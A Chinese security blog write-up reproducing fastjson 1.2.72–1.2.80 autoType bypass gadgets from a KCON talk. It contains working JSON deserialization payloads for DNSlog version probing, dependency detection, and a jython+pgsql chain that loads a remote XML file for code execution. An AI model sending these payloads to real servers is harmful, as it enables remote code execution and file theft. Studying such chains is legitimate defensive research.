**1.2.72 <fastjson<=1.2.80**

##  **01** 漏洞分析

本文是对浅蓝师傅在KCON大会上分享的议题的复现记录。

  

首先这次的绕过要求fastjson的版本大于1.2.72，我们可以先看下fastjson在1.2.73修改了哪些内容。

https://github.com/alibaba/fastjson/commit/100964a3481434a1258fd327bf18987e310b8361

![1666083428_634e6a640ef4403f82c8f.png!small?1666083428943](https://image.3001.net/images/20221018/1666083428_634e6a640ef4403f82c8f.png!small?1666083428943)

  

修改的地方在JSONObject.toJavaObject，反序列化类时，类实例化的部分。这个其实是修复了一个bug，之前对类属性恢复的需要属性必须有Annotation，修改后类属性与显示指定的类不相同和拥有注解两者只要满足一个即可，而显示指定的类我们可以不传置为null。

  

实例化类属性后，fastjson就会将其加入到反序列化缓存TypeUtils.mappings中，之后对类反序列化时，就会从缓存中获取类。

![1666083439_634e6a6fd5fe975de8674.png!small?1666083440898](https://image.3001.net/images/20221018/1666083439_634e6a6fd5fe975de8674.png!small?1666083440898)

  

借助玄武实验室分享的checkAutoType的流程可以看出，期望类及其子类不在黑名单中就能通过检查。所以整理利用流程:第一步指定不在黑名单中的期望类，第二步利用期望类的属性，由隐式类间关系实例化并被加入类缓存，第三步直接利用或者利用缓存中的类，将其他类加入缓存。

  

第二步的重点在既不能显示指定期望类，而且还要进入JSONObject.toJavaObject的反序列化流程。浅蓝大佬给出的解决办法是"@type":"java.lang.String""@type":"xxx.Exception"，与MiscCodec。下面为浅蓝大佬给出的gadgets的复现。

  

##  **02** 版本探测-1

    
    
    {"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"1.zj96tn.ceye.io"}}}

![1666083463_634e6a879e79e42d0a2aa.png!small?1666083464781](https://image.3001.net/images/20221018/1666083463_634e6a879e79e42d0a2aa.png!small?1666083464781)

  

##  **03** 版本探测-2

    
    
    {"a":{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","x":{"@type":"java.net.InetSocketAddress"{"address":,"val":"1.zj96tn.ceye.io"}}},"b":{"@type":"java.lang.Exception","@type":"com.alibaba.fastjson.JSONException","message":{"@type":"java.net.InetSocketAddress"{"address":,"val":"2.zj96tn.ceye.io"}}}}

![1666083483_634e6a9bde444fbedbe79.png!small?1666083484910](https://image.3001.net/images/20221018/1666083483_634e6a9bde444fbedbe79.png!small?1666083484910)

![1666083496_634e6aa8b3d606d8bfc2a.png!small?1666083497680](https://image.3001.net/images/20221018/1666083496_634e6aa8b3d606d8bfc2a.png!small?1666083497680)

  

##  **04** 报错探测依赖库

    
    
    {"@type":"java.lang.Character"{"@type":"java.lang.Class","val":"com.mysql.jdbc.Driver"}

![1666083517_634e6abda0699483c476e.png!small?1666083518864](https://image.3001.net/images/20221018/1666083517_634e6abda0699483c476e.png!small?1666083518864)

  

##  **05** dnslog探测依赖库

只有MacOS可以ping带花括号的域名，Linux和Windows会报错。所以这个探测链的Poc需要要合适的报错环境才能看到结果。

![1666083562_634e6aeaa09c1e35630f6.png!small?1666083563490](https://image.3001.net/images/20221018/1666083562_634e6aeaa09c1e35630f6.png!small?1666083563490)

    
    
    {"@type":"java.net.Inet4Address","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"java.util.Locale","country":"zj96tn.ceye.io","language":{"@type":"java.lang.String"{"x":{"@type":"java.lang.Class","val":"org.python.antlr.ParseException"}}}}}

  

已知可以作为gadget的条件是

1.类为Throwable的子类

2.setter方法的参数类型、public field参数类型或者是构造方法的参数类型，实例化之后的类可利用

  

以jython中的org.python.antlr.ParseException为例，org.python.antlr.ParseException的setType方法的参数类型为org.python.core.PyObject，根据上述描述，我们可以通过隐式类间关系实例化org.python.core.PyObject，那么这个类就会被加入缓存，将这个类作为期望类，这个类的子类就可以被实例化。

  

com.ziclix.python.sql.PyConnection为org.python.core.PyObject的子类，它的构造方法的参数类型为java.sql.Connection，同样的原理，意味着可以实例化java.sql.Connection的所有子类。常用的数据库利用姿势为pgsql、mysql等。

  

org.python.antlr.ParseException#setType

  * org.python.core.PyObject

  * com.ziclix.python.sql.PyConnection

![1666083579_634e6afb8714bbff836de.png!small?1666083581893](https://image.3001.net/images/20221018/1666083579_634e6afb8714bbff836de.png!small?1666083581893)

  

##  **06** jython+pgsql分析复现

1.指定期望类为java.lang.Exception，实例化org.python.antlr.ParseException

    
    
    {"@type":"java.lang.Exception","@type":"org.python.antlr.ParseException",}

  

  * com.alibaba.fastjson.parser.ParserConfig#checkAutoType

![1666083599_634e6b0f88ee78d0cafd2.png!small?1666083600481](https://image.3001.net/images/20221018/1666083599_634e6b0f88ee78d0cafd2.png!small?1666083600481)

  

2.通过MiscCodec，进入到JSONObject.toJavaObject，实例化setType方法参数的类属性org.python.core.PyObject

    
    
    {"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException","type":{}}}}

  

  * com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#createInstance

  

在类反序列化时，将type的类属性org.python.core.PyObject实例化

![1666083612_634e6b1cce984126cb7bb.png!small?1666083613779](https://image.3001.net/images/20221018/1666083612_634e6b1cce984126cb7bb.png!small?1666083613779)

  

3.指定期望类为org.python.core.PyObject，实例化com.ziclix.python.sql.PyConnection的构造方法参数connection的类属性java.sql.Connection

    
    
    {"@type":"org.python.core.PyObject","@type":"com.ziclix.python.sql.PyConnection","connection":{"@type":"org.postgresql.jdbc.PgConnection","hostSpecs":[{"host":"127.0.0.1","port":2333}],"user":"user","database":"test","info":{"socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext","socketFactoryArg":"http://127.0.0.1"},"url":""}}

  

  * com.alibaba.fastjson.parser.ParserConfig#checkAutoType

  

将显示指定的com.ziclix.python.sql.PyConnection，加入到缓存中

![1666083628_634e6b2c2003bec3565e5.png!small?1666083628990](https://image.3001.net/images/20221018/1666083628_634e6b2c2003bec3565e5.png!small?1666083628990)

  

之后在实例化org.postgresql.jdbc.PgConnection类时，它的接口为java.sql.Connection，也就是期望类为java.sql.Connection，这个类在之前已经被加入到了缓存中，所以它及它的子类不在黑名单中就可以通过检查。

![1666083639_634e6b378c7a4994f9000.png!small?1666083640486](https://image.3001.net/images/20221018/1666083639_634e6b378c7a4994f9000.png!small?1666083640486)

  

pgjdbc版本>=42.3.0，<42.3.2或者>=REL9.4.1208，<42.2.25,可以通过连接参数socketFactory指定类，实例化插件实例。例如可以指定类为org.springframework.context.support.ClassPathXmlApplicationContext

    
    
    jdbc:postgresql://node1/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://target/exp.xml");

  

  * org.springframework.context.support.ClassPathXmlApplicationContext

ClassPathXmlApplicationContext可以解析xml文件中的bean配置或者spel表达式，构造恶意的payload可造成代码执行。

![1666083674_634e6b5a8c98fc05ee7a7.png!small?1666083675999](https://image.3001.net/images/20221018/1666083674_634e6b5a8c98fc05ee7a7.png!small?1666083675999)

  

4.将之前的payload组合发送

    
    
    {"a":{"@type":"java.lang.Exception","@type":"org.python.antlr.ParseException",},"b":{"@type":"java.lang.Class","val":{"@type":"java.lang.String"{"@type":"java.util.Locale","val":{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"java.lang.String""@type":"org.python.antlr.ParseException","type":{}}}},"c":{"@type":"org.python.core.PyObject","@type":"com.ziclix.python.sql.PyConnection","connection":{"@type":"org.postgresql.jdbc.PgConnection","hostSpecs":[{"host":"127.0.0.1","port":2333}],"user":"user","database":"test","info":{"socketFactory":"org.springframework.context.support.ClassPathXmlApplicationContext","socketFactoryArg":"http://127.0.0.1"},"url":""}}}

![1666083692_634e6b6c9147ed302fc5b.png!small?1666083693883](https://image.3001.net/images/20221018/1666083692_634e6b6c9147ed302fc5b.png!small?1666083693883)

  

 **07** 其余gadgets的原理类似，在此不做具体分析，只进行复现

 **jython+mysql**

5.1.11-5.1.48

![1666083714_634e6b82b5516675c00e5.png!small?1666083715716](https://image.3001.net/images/20221018/1666083714_634e6b82b5516675c00e5.png!small?1666083715716)

  

6.0.2-6.0.3

![1666083724_634e6b8c363c706bde758.png!small?1666083725301](https://image.3001.net/images/20221018/1666083724_634e6b8c363c706bde758.png!small?1666083725301)

  

6.x or < 8.0.20

![1666083735_634e6b973f2664c532171.png!small?1666083736349](https://image.3001.net/images/20221018/1666083735_634e6b973f2664c532171.png!small?1666083736349)

  

 **OGNL**

有回显文件读取

![1666083746_634e6ba262d1ab478141e.png!small?1666083747394](https://image.3001.net/images/20221018/1666083746_634e6ba262d1ab478141e.png!small?1666083747394)

  

文件写入

commons-io 2.0 - 2.6 版本

![1666083758_634e6bae39c47c6232894.png!small?1666083759402](https://image.3001.net/images/20221018/1666083758_634e6bae39c47c6232894.png!small?1666083759402)

  

 **xalan、dom4j**

有回显回显读取

由于fastjson解析的时候，前面报错是会影响后续的解析过程的，所以这个需要将payload分开发送

  

1.指定显式期望类，实例化DTMConfigurationException并被加入类缓存

![1666083768_634e6bb81011ff7f428ae.png!small?1666083769007](https://image.3001.net/images/20221018/1666083768_634e6bb81011ff7f428ae.png!small?1666083769007)

  

2.MiscCodec ->
JSONObject.toJavaObject，通过DTMConfigurationException中的locator属性，由隐式类间关系实例化并被加入类缓存

  

  * 将org.apache.xpath.objects.XNodeSetForDOM加入缓存

![1666083780_634e6bc4a8d53cde26242.png!small?1666083781701](https://image.3001.net/images/20221018/1666083780_634e6bc4a8d53cde26242.png!small?1666083781701)

  

  * 将org.apache.xpath.XPathContext、org.dom4j.io.XMLWriter、org.dom4j.io.SAXContentHandler、java.io.InputStream加入缓存

![1666083791_634e6bcf4f2b50dc069ab.png!small?1666083792383](https://image.3001.net/images/20221018/1666083791_634e6bcf4f2b50dc069ab.png!small?1666083792383)

  

3.利用org.apache.commons.io.input.BOMInputStream读取文件

![1666083800_634e6bd851a578c8de936.png!small?1666083801437](https://image.3001.net/images/20221018/1666083800_634e6bd851a578c8de936.png!small?1666083801437)

  

文件写入

指定期望类加入缓存的方法与文件读取的方法一样，这里直接进行文件写入

  

commons-io 2.0 - 2.6 版本

![1666083811_634e6be3ad68081a33d7a.png!small?1666083812819](https://image.3001.net/images/20221018/1666083811_634e6be3ad68081a33d7a.png!small?1666083812819)

  

 **aspectj**

有回显文件读取

![1666083820_634e6bec5542d54f141d6.png!small?1666083821453](https://image.3001.net/images/20221018/1666083820_634e6bec5542d54f141d6.png!small?1666083821453)

  

DNSlog回显

windows不可以且需要dnslog平台支持特殊符号

![1666083830_634e6bf6bf1127ca47936.png!small?1666083831722](https://image.3001.net/images/20221018/1666083830_634e6bf6bf1127ca47936.png!small?1666083831722)

  

![1666083842_634e6c024f1bc3398bc72.png!small?1666083843271](https://image.3001.net/images/20221018/1666083842_634e6c024f1bc3398bc72.png!small?1666083843271)

  

报错回显

![1666083852_634e6c0c9329372a66379.png!small?1666083853696](https://image.3001.net/images/20221018/1666083852_634e6c0c9329372a66379.png!small?1666083853696)

  

HTTPLOG回显

1.使用一个可以把inputstream或者Reader添加到缓存白名单的前置链。如OGNL，把XmlStreamReader添加到白名单，再基于URLReader发起HTTP请求来携带数据

![1666083863_634e6c1719325af3d88bc.png!small?1666083864706](https://image.3001.net/images/20221018/1666083863_634e6c1719325af3d88bc.png!small?1666083864706)

  

groovy

1.指定显式期望类，实例化CompilationFailedException并被加入类缓存,并通过unit属性，将隐式类间关系实例化并被加入类缓存

![1666083873_634e6c210780369123147.png!small?1666083874005](https://image.3001.net/images/20221018/1666083873_634e6c210780369123147.png!small?1666083874005)

  

2.利用

org.codehaus.groovy.tools.javac.JavaStubCompilationUnit#init(CompilerConfiguration
config,...)

  * org.codehaus.groovy.control.CompilationUnit#init

  * org.codehaus.groovy.control.CompilationUnit#addPhaseOperations

• org.codehaus.groovy.transform.ASTTransformationVisitor#addPhaseOperations

• org.codehaus.groovy.transform.ASTTransformationVisitor#addGlobalTransforms

• org.codehaus.groovy.transform.ASTTransformationVisitor#doAddGlobalTransforms

  

从指定URL读取环境配置

![1666083883_634e6c2b7ed14af451a9a.png!small?1666083884486](https://image.3001.net/images/20221018/1666083883_634e6c2b7ed14af451a9a.png!small?1666083884486)

  

  * org.codehaus.groovy.transform.ASTTransformationVisitor#addPhaseOperationsForGlobalTransforms

![1666083892_634e6c349bc63a43529c0.png!small?1666083894009](https://image.3001.net/images/20221018/1666083892_634e6c349bc63a43529c0.png!small?1666083894009)

  

![1666083902_634e6c3e466e8cfa2792b.png!small?1666083903114](https://image.3001.net/images/20221018/1666083902_634e6c3e466e8cfa2792b.png!small?1666083903114)

  

![1666083908_634e6c441bee90105f9ba.png!small?1666083909223](https://image.3001.net/images/20221018/1666083908_634e6c441bee90105f9ba.png!small?1666083909223)

  

##  **08** 攻击技术分析

本文主要分析了 fastjson 1.2.80 漏洞的成因，以及对已公开的几种 gadget 的分析复现。如有错误之处，欢迎各位师傅们指点交流，不胜感激。

参考

《Hacking JSON》- 浅蓝

